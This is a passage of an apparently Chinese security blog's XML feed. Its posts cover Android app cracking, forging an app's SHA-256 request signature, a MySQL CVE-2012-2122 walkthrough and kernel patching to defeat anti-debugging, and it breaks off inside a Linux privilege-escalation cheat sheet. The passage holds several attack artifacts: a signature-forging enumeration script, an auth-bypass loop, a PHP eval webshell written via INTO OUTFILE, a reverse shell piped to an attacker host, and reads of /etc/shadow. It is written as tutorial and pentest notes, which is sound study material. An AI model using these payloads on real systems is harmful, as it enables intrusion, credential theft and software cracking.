E3                                     CMP     R0, #0             </code></pre><p>这样达到从getvalue获取返回值后，重新修改v2的值为3，让其无论什么情况下都自动判断为已注册企业版。</p><p>网上其他的分析文章，同样是修改n1函数，只不过修改方式是同时修改几个mov语句，让其都赋值3来跳转判断。</p><p>详细文章：<a href="http://ju.outofmemory.cn/entry/33818" target="_blank" rel="noopener">简单Android CrackMe分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ISCC-Android-Crackme&quot;&gt;&lt;a href=&quot;#ISCC-Android-Crackme&quot; class=&quot;headerlink&quot; title=&quot;ISCC Android Crackme&quot;&gt;&lt;/a&gt;ISCC Android Crackme&lt;/h3&gt;&lt;
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>APP解密参数sign</title>
    <link href="/2019/04/APP%E8%A7%A3%E5%AF%86%E5%8F%82%E6%95%B0sign/"/>
    <id>/2019/04/APP解密参数sign/</id>
    <published>2019-04-18T08:34:21.000Z</published>
    <updated>2019-07-26T09:56:16.713Z</updated>
    
    <content type="html"><![CDATA[<h3 id="APP解密参数sign"><a href="#APP解密参数sign" class="headerlink" title="APP解密参数sign"></a>APP解密参数sign</h3><p>APP是公司自己的业务APP，没有加固，只做了代码混淆。本以为要对加密字段进行so文件的逆向，查看后发现是Java层的加密，相对较简单。</p><p>首先抓包查看加密字段和相关参数值，可以看到一共有四个参数，其中sign是加密验证完整性字段</p><p><img src="\2019\04\APP解密参数sign\1555574089554.png" alt="1555574089554"></p><p>利用AK逆向APP包，搜索sign字段信息，但是搜索结果过多，查找较困难，但是sign是一个data参数字段，因此尝试更换其他字段搜索。</p><p><img src="\2019\04\APP解密参数sign\1555574535666.png" alt="1555574535666"></p><p>搜索reqData字段可以看到，搜索结果就smali文件存在，第一个为程序包，查看代码，利用jd来查看反编译Java代码。</p><p><img src="\2019\04\APP解密参数sign\1555574610824.png" alt="1555574610824"></p><p>搜索字段，可以看到如下所示，以下字段可以看出，程序对其四个字段的获取都有代表的变量，而我们只需要获取sign的变量，localObject2。</p><p>变量的值来源为t包的b方法，可以明显看到，值为nonce，tiestamp, localObject1, t.f的相加值。而localObject1为reqData的值。</p><p><img src="\2019\04\APP解密参数sign\1555575022131.png" alt="1555575022131"></p><p>查看t.b的方法，方法如下，对字段进行sha-256加密。查看a方法</p><pre><code>public static String b(String paramString)  {    return a(paramString, &quot;SHA-256&quot;);  }</code></pre><p>其中t.a的执行为对指定的参数进行指定的加密，利用传入参数来确定。</p><pre><code>public static String a(String paramString1, String paramString2)  {    try    {      paramString2 = MessageDigest.getInstance(paramString2);      paramString2.update(paramString1.getBytes());      paramString1 = a(paramString2.digest());      return paramString1;    }    catch (Exception paramString1)    {      paramString1.printStackTrace();    }    return null;  }</code></pre><p>而t.f代表的是一段加密公钥，此处不在列出，利用在线工具查看加密结果是否一致。可以看到加密后的参数和抓到的包结果一致。</p><p><img src="\2019\04\APP解密参数sign\1555575489330.png" alt="1555575489330"></p><p>那么就可以利用我们自己生成加密参数的方式来进行测试，例如如下脚本，通过判断响应返回的字段来获取参数值，查看是否越权等信息。</p><pre><code>#coding : utf-8import hashlibimport requestsheaders = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,    &#39;Cookie&#39;: &#39;JSESSIONID=xxxxxxx&#39;,    &#39;User-Agent&#39;: &#39;okhttp/3.4.1&#39;}for i in range(60200000, 60295558):    sha = &#39;MIICdgIBADAN.....TMK63hMPgm25mbCD0vKhsQtcSDlzVwtOOoNlW5E8CQQDNXVwGolFCqU9lb5147AHc+&lt;INF&gt;&lt;action&gt;...&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;LE8I2QTAFHJM3M.....1555571421812&#39;    h = hashlib.sha256(sha)    sha256 = h.hexdigest()    data = &#39;reqData=&lt;INF&gt;&lt;action&gt;.....&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;&amp;nonce=LE8I2QTAFHJM3MO.....&amp;timestamp=1555571421812&amp;sign=&#39;+sha256    r = requests.post(&#39;http://xxxxxx/api&#39;, data = data, headers=headers)    if &#39;xxxxxx&#39; in r.text:        print i</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;APP解密参数sign&quot;&gt;&lt;a href=&quot;#APP解密参数sign&quot; class=&quot;headerlink&quot; title=&quot;APP解密参数sign&quot;&gt;&lt;/a&gt;APP解密参数sign&lt;/h3&gt;&lt;p&gt;APP是公司自己的业务APP，没有加固，只做了代码混淆。本以为要对加
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>MySQL历史漏洞分析</title>
    <link href="/2019/04/MySQL%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>/2019/04/MySQL历史漏洞分析/</id>
    <published>2019-04-12T06:05:30.000Z</published>
    <updated>2019-04-12T08:54:58.191Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MySQL历史漏洞分析"><a href="#MySQL历史漏洞分析" class="headerlink" title="MySQL历史漏洞分析"></a>MySQL历史漏洞分析</h3><p>前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使用少，而且是外包托管阿里云，因此并没有影响其他系统。拿到这个系统后，查看端口服务时发现，数据库端口对外开放，ssh对外开放，然后根据对系统的核查，猜测有可能存在以下问题：</p><p>1、后台弱口令或者登陆绕过</p><p>2、mysql弱口令</p><p>3、ssh弱口令爆破</p><p>经过后来优先对外的端口审查，发现是数据库漏洞，MySQL的cve-2012-2122，身份验证漏洞。</p><p>简单的说就是MySQL对身份验证上存在缺陷，大概256次登陆认证就会出现一次认证成功。并不在乎密码的正确性。</p><p>漏洞介绍：</p><pre><code>https://seclists.org/oss-sec/2012/q2/493</code></pre><p>漏洞原因：</p><pre><code>my_bool check_scramble(const uchar *scramble_arg, const char *message,               const uint8 *hash_stage2){  SHA1_CONTEXT sha1_context;  uint8 buf[SHA1_HASH_SIZE];  uint8 hash_stage2_reassured[SHA1_HASH_SIZE];  mysql_sha1_reset(&amp;sha1_context);  /* create key to encrypt scramble */ mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH);  mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE);  mysql_sha1_result(&amp;sha1_context, buf);  /* encrypt scramble */ my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH);  /* now buf supposedly contains hash_stage1: so we can get hash_stage2 */ mysql_sha1_reset(&amp;sha1_context);  mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE);  mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured);  return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE);}</code></pre><p>以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。</p><p>而此漏洞并不是版本通病是MySQL在编译时，需添加-fno-builtin，并且所使用的glibc是经SSE优化后的，只不过glibc是系统自带。</p><p>漏洞利用：</p><pre><code>使用如下poc：for i in `seq 1 1000`; do mysql -u root --password=root -h 127.0.0.1 2&gt;/dev/null; done</code></pre><p>环境采用vulhub的docker环境，测试成功后返回如下：</p><p><img src="\2019\04\MySQL历史漏洞分析\1555050537911.png" alt="1555050537911"></p><p>那么拿到数据库怎么尝试获取服务权限，可以获取数据库账号密码来维持对数据库的访问和root权限。</p><pre><code>select user,password from mysql.user;</code></pre><p><img src="\2019\04\MySQL历史漏洞分析\1555050975845.png" alt="1555050975845"></p><p>MySQL密码加密由sha1加密后再unhex加密再sha1加密的字段，可以再md5等密码查询网站查找。如上密码为123456。</p><p>还可以使用导出的形式，利用如下：</p><pre><code>Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;/var/www/html/a.txt&#39;;  #这种需要知道web路径</code></pre><p>同样也可以使用load_file来查看系统文件等</p><pre><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;) </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;MySQL历史漏洞分析&quot;&gt;&lt;a href=&quot;#MySQL历史漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;MySQL历史漏洞分析&quot;&gt;&lt;/a&gt;MySQL历史漏洞分析&lt;/h3&gt;&lt;p&gt;前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>逆向修改手机内核，绕过反调试</title>
    <link href="/2019/04/%E9%80%86%E5%90%91%E4%BF%AE%E6%94%B9%E6%89%8B%E6%9C%BA%E5%86%85%E6%A0%B8%EF%BC%8C%E7%BB%95%E8%BF%87%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <id>/2019/04/逆向修改手机内核，绕过反调试/</id>
    <published>2019-04-02T05:59:49.000Z</published>
    <updated>2019-07-26T09:56:34.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="逆向修改手机内核，绕过反调试"><a href="#逆向修改手机内核，绕过反调试" class="headerlink" title="逆向修改手机内核，绕过反调试"></a>逆向修改手机内核，绕过反调试</h3><p>Android 应用反调试里最常用的一种反调试方法是查看/proc/self/status的信息，如果 TracerPid 不为 0，就判断为正在被调试。因此修改手机的TracePid,让其值恒为零。</p><h4 id="一、-提取-zImage-内核文件"><a href="#一、-提取-zImage-内核文件" class="headerlink" title="一、  提取 zImage 内核文件"></a>一、  提取 zImage 内核文件</h4><p>查找boot文件位置</p><pre><code>find / | grep bootcd /dev/block/platform/7824900.sdhci/by-name/将boot导出为boot.imgdd if=/dev/block/mmcblk0p22 of=/sdcard/boot.img</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185489216.png" alt="1554185489216"></p><p>把boot转移到可以下载的目录，由于adb权限问题，复制到sd卡目录下。</p><pre><code>adb pull /sdcard/boot.img d:\a</code></pre><p>然后下载bootimg解压boot文件：</p><pre><code>git clone https://github.com/pbatard/bootimg-tools.gitmake</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185769689.png" alt="1554185769689"></p><p>此时已经生成二进制文件，在mkbootimg目录下，进入此目录使用unmkbootimg，提取kernel</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185817995.png" alt="1554185817995"></p><p>提取原始zImage</p><p>将kernel文件复制为文件名为zImage.gz的文件，并使用010editor查找十六进制1f 8b 08 00，找到后把前面的数据全删掉，使文件变成标准的gzip压缩文件，这样子就可以使用gunzip解压了。</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185942154.png" alt="1554185942154"></p><p>修改完成后，解压缩文件，提取zImage</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185966036.png" alt="1554185966036"></p><h4 id="二、-提位、修改关键代码"><a href="#二、-提位、修改关键代码" class="headerlink" title="二、  提位、修改关键代码"></a>二、  提位、修改关键代码</h4><p>zImage文件可以直接使用 IDA 去打开，但需要设置参数。（建议使用6.8版本，因为在索引函数时可以自动识别，而7.0则不可）</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186082956.png" alt="1554186082956"></p><p>点击OK后，确定进入ARM，然后弹出此对话框，填入0xc0008000</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186088780.png" alt="1554186088780"></p><p>原文要求修改函数指令来达到修改的效果，但在修改过程中发现，对不同kernel，最后查到的对应proc_pid_status函数操作指令不一致。</p><pre><code>echo 0 &gt; /proc/sys/kernel/kptr_restrict关闭符号屏蔽再输入以下命令查看这两函数的地址cat /proc/kallsyms |grep proc_pid_statuscat /proc/kallsyms |grep __task_pid_nr_ns</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554187063821.png" alt="1554187063821"></p><p>为了避免修改出错刷入手机成砖的风险，采用了另一方式，shift+f12来打开字符串窗口，查找TracerPid，修改其后的占位符，把%d修改为0和%09(30  09)。</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186414392.png" alt="1554186414392"></p><p>其对应的Hex窗口修改为如下所示：</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186447080.png" alt="1554186447080"></p><p>使用<code>gzip -n -f -9 zImage</code>压缩修改后的内核裸文件，压缩后会比原来的小，必须比原来的文件小才可以。得到zImage.gz，我们使用010分别打开zImage.gz和boot.img，搜索1F 8B 08 00。按下insert键，将010改为overwrite，注意这里必须是覆盖，这样就不用考虑插入后大小的问题了，把zImage.gz的内容复制到boot.img的相应位置。boot.img会有两个1F 8B 08 00，修改第一个，把其中的十六进制改为zImage.gz文件的十六进制值，在edit选项中进行覆写。</p><p>修改完成后，刷入手机，利用SDK自带的fastboot。</p><pre><code>adb reboot bootloader   # 启动fastboot模式fastboot flash boot boot.img   #刷入boot分区fastboot reboot  #重启</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186828423.png" alt="1554186828423"></p><h4 id="调试查看"><a href="#调试查看" class="headerlink" title="调试查看"></a>调试查看</h4><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554187063866.png" alt="1554187063866"></p><p>如想使用修改函数操作指令的方式可以参考原作者方式：</p><p>1、<a href="https://www.jianshu.com/p/91aa37f3a972" target="_blank" rel="noopener">逆向修改手机内核，绕过反调试</a></p><p>2、<a href="https://www.xmsec.cc/re-modify-kernel-bypass-antidebug/" target="_blank" rel="noopener">逆向修改内核，绕过TracerPID反调试</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;逆向修改手机内核，绕过反调试&quot;&gt;&lt;a href=&quot;#逆向修改手机内核，绕过反调试&quot; class=&quot;headerlink&quot; title=&quot;逆向修改手机内核，绕过反调试&quot;&gt;&lt;/a&gt;逆向修改手机内核，绕过反调试&lt;/h3&gt;&lt;p&gt;Android 应用反调试里最常用的一种反调
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>IDA动态调试</title>
    <link href="/2019/03/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>/2019/03/IDA动态调试/</id>
    <published>2019-03-29T08:31:34.000Z</published>
    <updated>2019-07-26T09:56:06.610Z</updated>
    
    <content type="html"><![CDATA[<h3 id="IDA-动态调试"><a href="#IDA-动态调试" class="headerlink" title="IDA 动态调试"></a>IDA 动态调试</h3><p>通常在APP逆向和破解时，某些重要的函数会以so文件的形式进行加载，所以，在想获得关键操作逻辑和修改某些函数时，就需要IDA来进行操作啦。以下使用IDA版本7.0，小米手机</p><h4 id="1、上传Android-Server"><a href="#1、上传Android-Server" class="headerlink" title="1、上传Android_Server"></a>1、上传Android_Server</h4><p>文件存放在安装目录下的dbgsrv目录中，7.0以后版本多了几个其他版本的Android_server文件，上传Android_server文件到手机目录中，并提升执行权限。</p><pre><code>adb push android_server /data/local/tmp/chmod 755 android_serveradb forward tcp:23946 tcp:23946</code></pre><p>执行后就可以显示正在监听23946端口，如果报错，一般是使用位数和系统不一致。</p><h4 id="2、调试启动APP"><a href="#2、调试启动APP" class="headerlink" title="2、调试启动APP"></a>2、调试启动APP</h4><p>以调试模式启动app</p><pre><code>adb shell am start -D -n 包名/.MainActivity</code></pre><p>手机界面显示等待调试中，便可以进行下一步了。</p><h4 id="3、查看APP-PID"><a href="#3、查看APP-PID" class="headerlink" title="3、查看APP PID"></a>3、查看APP PID</h4><p>调试进程进行端口转发，查看进程对应PID。</p><pre><code>adb shell ps | grep 包名adb forward tcp:8700 jdwp:pid</code></pre><p>8700端口一般为默认的本地调试端口，如果不一致，可以在DDMS中查看。</p><h4 id="4、IDA附加进程"><a href="#4、IDA附加进程" class="headerlink" title="4、IDA附加进程"></a>4、IDA附加进程</h4><p>附加进程调试时，有时候需要对，如下的选项进行勾选，一般在需要动态加载so文件，调试JNI_onload函数的时候需要，对于一般调试静态函数的，需要拦取执行后断点的，可能连调试模式启动app都不需要。</p><p><img src="\2019\03\IDA动态调试\1553850211516.png" alt="1553850211516"></p><p>选择后，便可以在attach to process选项中查看到相应的可调试进程了。如果没有进程可能是你的APP不能调试，需要添加可调试参数。或者直接修改ro.debuggable=1。</p><p><img src="\2019\03\IDA动态调试\1553850356604.png" alt="1553850356604"></p><h4 id="5、JDB附加"><a href="#5、JDB附加" class="headerlink" title="5、JDB附加"></a>5、JDB附加</h4><p>执行jdb附加</p><pre><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></pre><h4 id="6、调试选择"><a href="#6、调试选择" class="headerlink" title="6、调试选择"></a>6、调试选择</h4><p>选择完成后，进入调试状态，在右边的modules栏可以看到加载进来的so文件。选择需要调试的so文件，如果没有看到需要的so文件，说明so文件是动态加载的，这时候F9运行，就可以看到相应的so文件了。</p><p>选择相应的so文件后，会显示so文件中的函数，选择对于函数即可。</p><p><img src="\2019\03\IDA动态调试\1553850903002.png" alt="1553850903002"></p><h4 id="7、调试断点"><a href="#7、调试断点" class="headerlink" title="7、调试断点"></a>7、调试断点</h4><p>如选择对于的JNI_Onload 函数，这时候界面会跳转到函数的起始位置，当然也可以使用基地址加偏移地址的方式寻找。找到函数位置后就可以F2下断点了。</p><p>断点执行后，点击F9再次运行，程序就可以执行到断点位置，当然有些是需要配合界面操作来执行。由于以上是抓取JNI_Onload函数，直接运行即可。</p><p>利用F8步过，F7步入进行调试即可。</p><p>对于调试结果，可以查看右侧寄存器变化，和下面的Hex View 变化值，来查看是否有需要的执行结果和函数值。    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;IDA-动态调试&quot;&gt;&lt;a href=&quot;#IDA-动态调试&quot; class=&quot;headerlink&quot; title=&quot;IDA 动态调试&quot;&gt;&lt;/a&gt;IDA 动态调试&lt;/h3&gt;&lt;p&gt;通常在APP逆向和破解时，某些重要的函数会以so文件的形式进行加载，所以，在想获得关键操作逻
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>基本Linux权限提升</title>
    <link href="/2019/03/%E5%9F%BA%E6%9C%ACLinux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>/2019/03/基本Linux权限提升/</id>
    <published>2019-03-18T05:49:53.000Z</published>
    <updated>2019-03-18T05:50:20.054Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p><h1 id="基本Linux权限提升"><a href="#基本Linux权限提升" class="headerlink" title="基本Linux权限提升"></a>基本Linux权限提升</h1><h4 id="枚举是关键。"><a href="#枚举是关键。" class="headerlink" title="枚举是关键。"></a>枚举是关键。</h4><p>（Linux）权限升级就是：</p><ul><li>收集 - <strong>*枚举</strong>，更多枚举和更多枚举。*</li><li>流程 - <em>对数据<strong>进行</strong>排序，<strong>分析</strong>和确定优先级。</em></li><li>搜索 - <em>了解要搜索的内容以及在何处<strong>查找</strong>漏洞利用代码。</em></li><li>适应 - <strong>*自定义</strong>漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。*</li><li>尝试 - <em>为（大量）<strong>试验和错误</strong>做好准备。</em></li></ul><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h4 id="什么是分销类型？什么版本？"><a href="#什么是分销类型？什么版本？" class="headerlink" title="什么是分销类型？什么版本？"></a>什么是分销类型？什么版本？</h4><pre><code>cat /etc/issue cat /etc/*-release   cat /etc/lsb-release      # Debian based   cat /etc/redhat-release   # Redhat based </code></pre><h4 id="什么是内核版本？是64位吗？"><a href="#什么是内核版本？是64位吗？" class="headerlink" title="什么是内核版本？是64位吗？"></a>什么是内核版本？是64位吗？</h4><pre><code>cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- </code></pre><h4 id="从环境变量中可以学到什么？"><a href="#从环境变量中可以学到什么？" class="headerlink" title="从环境变量中可以学到什么？"></a>从环境变量中可以学到什么？</h4><pre><code>cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set</code></pre><h4 id="有打印机吗？"><a href="#有打印机吗？" class="headerlink" title="有打印机吗？"></a>有打印机吗？</h4><pre><code>lpstat -a</code></pre><h2 id="应用与服务"><a href="#应用与服务" class="headerlink" title="应用与服务"></a>应用与服务</h2><h4 id="正在运行什么服务？哪个服务具有哪个用户权限？"><a href="#正在运行什么服务？哪个服务具有哪个用户权限？" class="headerlink" title="正在运行什么服务？哪个服务具有哪个用户权限？"></a>正在运行什么服务？哪个服务具有哪个用户权限？</h4><pre><code>ps aux ps -ef top cat /etc/services</code></pre><h4 id="root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！"><a href="#root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！" class="headerlink" title="root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！"></a>root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！</h4><pre><code>ps aux | grep root ps -ef | grep root</code></pre><h4 id="安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？"><a href="#安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？" class="headerlink" title="安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？"></a>安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？</h4><pre><code>ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archivesO ls -alh /var/cache/yum/</code></pre><h4 id="任何服务设置配置错误？是否附加了任何（易受攻击的）插件？"><a href="#任何服务设置配置错误？是否附加了任何（易受攻击的）插件？" class="headerlink" title="任何服务设置配置错误？是否附加了任何（易受攻击的）插件？"></a>任何服务设置配置错误？是否附加了任何（易受攻击的）插件？</h4><pre><code>cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/ </code></pre><h4 id="安排了哪些工作？"><a href="#安排了哪些工作？" class="headerlink" title="安排了哪些工作？"></a>安排了哪些工作？</h4><pre><code>crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root</code></pre><h4 id="任何纯文本用户名和-或密码？"><a href="#任何纯文本用户名和-或密码？" class="headerlink" title="任何纯文本用户名和/或密码？"></a>任何纯文本用户名和/或密码？</h4><pre><code>grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</code></pre><h2 id="通信与网络"><a href="#通信与网络" class="headerlink" title="通信与网络"></a>通信与网络</h2><h4 id="系统有哪些NIC？它是否连接到另一个网络？"><a href="#系统有哪些NIC？它是否连接到另一个网络？" class="headerlink" title="系统有哪些NIC？它是否连接到另一个网络？"></a>系统有哪些NIC？它是否连接到另一个网络？</h4><pre><code>/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network</code></pre><h4 id="什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？"><a href="#什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？" class="headerlink" title="什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？"></a>什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？</h4><pre><code>cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname</code></pre><h4 id="其他用户和主机与系统进行通信的是什么？"><a href="#其他用户和主机与系统进行通信的是什么？" class="headerlink" title="其他用户和主机与系统进行通信的是什么？"></a>其他用户和主机与系统进行通信的是什么？</h4><pre><code>lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w</code></pre><h4 id="什么缓存？IP和-或MAC地址"><a href="#什么缓存？IP和-或MAC地址" class="headerlink" title="什么缓存？IP和/或MAC地址"></a>什么缓存？IP和/或MAC地址</h4><pre><code>arp -e route /sbin/route -nee</code></pre><h4 id="数据包嗅探可能吗？可以看到什么"><a href="#数据包嗅探可能吗？可以看到什么" class="headerlink" title="数据包嗅探可能吗？可以看到什么"></a>数据包嗅探可能吗？可以看到什么</h4><pre><code>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</code></pre><p>注意：tcpdump tcp dst [ip] [port]和tcp dst [ip] [port]</p><h4 id="你有壳吗？你能和系统互动吗？"><a href="#你有壳吗？你能和系统互动吗？" class="headerlink" title="你有壳吗？你能和系统互动吗？"></a>你有壳吗？你能和系统互动吗？</h4><pre><code>nc -lvp 4444    # Attacker. Input (Commands) nc -lvp 4445    # Attacker. Ouput (Results) telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP! `</code></pre><p>注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</p><h4 id="端口转发可能吗？重定向并与来自其他视图的流量进行交互"><a href="#端口转发可能吗？重定向并与来自其他视图的流量进行交互" class="headerlink" title="端口转发可能吗？重定向并与来自其他视图的流量进行交互"></a>端口转发可能吗？<em>重定向并与来自其他视图的流量进行交互</em></h4><p>注意：http：//<a href="http://www.boutell.com/rinetd/" target="_blank" rel="noopener">www.boutell.com/rinetd/</a></p><p>注意：http：//<a href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch" target="_blank" rel="noopener">www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a></p><p>注意：http：//downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip</p><p>注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]</p><pre><code>FPipe.exe -l 80 -r 80 -s 80 192.168.1.7</code></pre><p>注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip]</p><pre><code>ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port </code></pre><p>注意：mknod backpipe p; nc -l -p [远程端口] <backpipe |="" nc="" [本地ip]="" [本地端口]="">反向管道</backpipe></p><pre><code>mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe    # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080) </code></pre><h4 id="隧道可能吗？远程本地发送命令"><a href="#隧道可能吗？远程本地发送命令" class="headerlink" title="隧道可能吗？远程本地发送命令"></a>隧道可能吗？远程本地发送命令</h4><pre><code>ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig </code></pre><h2 id="机密信息和用户"><a href="#机密信息和用户" class="headerlink" title="机密信息和用户"></a>机密信息和用户</h2><h4 id="你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？"><a href="#你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？" class="headerlink" title="你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？"></a>你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？</h4><pre><code>id who w last cat /etc/passwd | cut -d: -f1    # List of users grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;   # List of super users awk -F: &#39;($3 == &quot;0&quot;) {print}&#39; /etc/passwd   # List of super users cat /etc/sudoers sudo -l</code></pre><h4 id="可以找到哪些敏感文件？"><a href="#可以找到哪些敏感文件？" class="headerlink" title="可以找到哪些敏感文件？"></a>可以找到哪些敏感文件？</h4><pre><code>cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/</code></pre><h4 id="家庭导演中有什么“有趣”的东西？如果可以访问"><a href="#家庭导演中有什么“有趣”的东西？如果可以访问" class="headerlink" title="家庭导演中有什么“有趣”的东西？如果可以访问"></a>家庭导演中有什么“有趣”的东西？如果可以访问</h4><pre><code>ls -ahlR /root/ ls -ahlR /home/</code></pre><h4 id="是否有密码-脚本，数据库，配置文件或日志文件？密码的默认路径和位置"><a 